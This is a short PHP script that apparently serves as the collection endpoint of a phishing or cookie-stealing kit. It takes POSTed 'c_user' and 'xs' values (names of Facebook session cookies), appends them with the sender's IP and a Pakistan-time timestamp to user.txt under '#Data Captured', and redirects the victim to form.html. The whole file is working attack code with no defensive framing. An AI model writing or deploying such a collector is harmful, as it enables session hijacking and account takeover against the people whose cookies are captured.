<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if the "c_user" and "xs" fields exist in the POST data
    if (isset($_POST["c_user"]) && isset($_POST["xs"])) {
        // Retrieve the values of "c_user" and "xs" from the POST data
        $c_user = $_POST["c_user"];
        $xs = $_POST["xs"];

        // Get the sender's IP address
        $sender_ip = $_SERVER['REMOTE_ADDR'];

        // Get the current time in Pakistani time (PKT)
        date_default_timezone_set('Asia/Karachi'); // Set the timezone to PKT
        $pkt_time = date('Y-m-d H:i:s'); // Format the time as needed

        // Create or open the user.txt file for writing
        $file = fopen("user.txt", "a"); // "a" means append to the file

        if ($file) {
            // Write the data to the file
            fwrite($file, "#Data Captured\n");
            fwrite($file, "c_user: " . $c_user . "\n");
            fwrite($file, "xs: " . $xs . "\n");
            fwrite($file, "Sender IP: " . $sender_ip . "\n");
            fwrite($file, "Data Receiving Time (PKT): " . $pkt_time . "\n");

            // Close the file
            fclose($file);

            // Perform the redirection to the new link
            header("Location: form.html"); // Replace with your desired URL
            exit(); // Ensure that no further output is sent
        } else {
            // Error handling if the file cannot be opened
            $response = ["success" => false, "message" => "Unable to save data"];
            echo json_encode($response);
        }
    } else {
        // If "c_user" and "xs" are not provided in the POST data, respond with an error
        $response = ["success" => false, "message" => "Missing fields"];
        echo json_encode($response);
    }
} else {
    // If the request method is not POST, respond with an error
    $response = ["success" => false, "message" => "Invalid request method"];
    echo json_encode($response);
}
?>
